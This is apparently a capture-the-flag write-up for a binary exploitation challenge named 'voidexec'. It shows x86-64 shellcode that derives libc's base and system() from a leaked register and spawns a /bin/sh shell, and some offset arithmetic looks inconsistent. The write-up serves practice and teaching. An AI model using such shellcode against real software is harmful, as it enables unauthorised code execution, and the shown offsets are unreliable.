# voidexec

**Category:** Pwn  
**Challenge Name:** voidexec  
**Tools:** pwntools, GDB, Ghidra

---

## Goal

Inject shellcode that dynamically computes the address of `system("/bin/sh")` based on a known libc pointer (`rcx`) and execute it to spawn a shell.

---

## How I Solved It

### 1. Context and Entry Point

Running the binary immediately jumps to a memory region where the attacker can inject shellcode.

At this point:
- The register **`rcx` contains a pointer into libc**.
- The goal is to **compute the address of `system()` from `rcx` alone**, then call it with `"/bin/sh"`.

---

### 2. Reconstructing the libc base

From debugging locally:
- `rcx = 0x7ffff7d1e8bb`
- Actual base of libc = `0x7ffff7fc6000`

So the offset from `rcx` to the base is:

```python
offset_to_base = base_libc_local - rcx_value
```

This gives us a way to calculate the base address at runtime from rcx.

### 3. Calculating system()

We know system()'s offset from the base using libc.symbols["system"].

So, the shellcode does:
```asm
add rcx, offset_to_base      ; rcx = libc base
add rcx, offset_system       ; rcx = address of system()
sub rcx, 0x3c6000            ; adjust for PIE if needed (optional patch)
xor rax, rax
mov rax, rcx                 ; put system() in rax

; Push "/bin/sh" string to the stack
mov rdx, 0x68732f6e69622f
push rdx
mov rdi, rsp                 ; rdi = "/bin/sh"
xor rsi, rsi
xor rdx, rdx
call rax                     ; call system("/bin/sh")
```

### 4. Injecting the payload

We send the assembled shellcode directly to the process input:
```python
p.send(shellcode)
```

Once injected, the shellcode computes the system address at runtime and spawns a shell.

---

You can find the full exploit script in [`main.py`](./main.py).
